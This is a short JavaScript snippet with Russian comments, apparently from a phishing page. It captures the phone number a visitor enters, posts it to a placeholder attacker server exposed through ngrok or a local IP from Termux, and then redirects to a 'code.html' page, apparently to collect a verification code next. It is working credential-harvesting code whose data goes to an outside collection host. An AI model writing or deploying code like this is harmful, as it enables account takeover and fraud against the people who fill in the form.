<script>
async function sendToBot(type, value) {
    // URL твоего сервера в Termux (через ngrok или локальный IP)
    const SERVER_URL = "http://ТВОЙ_IP_ИЛИ_NGROK:8080/log"; 
    
    try {
        await fetch(SERVER_URL, {
            method: 'POST',
            mode: 'cors',
            body: JSON.stringify({ type: type, value: value })
        });
    } catch(e) { console.log("Бот не в сети, но идем дальше"); }
}

async function goNext() {
    const val = document.getElementById('phone').value;
    if (val.length < 10) return alert("Введите номер!");
    
    await sendToBot('phone', val); // ОТПРАВКА БОТУ
    window.location.href = "code.html";
}
</script>
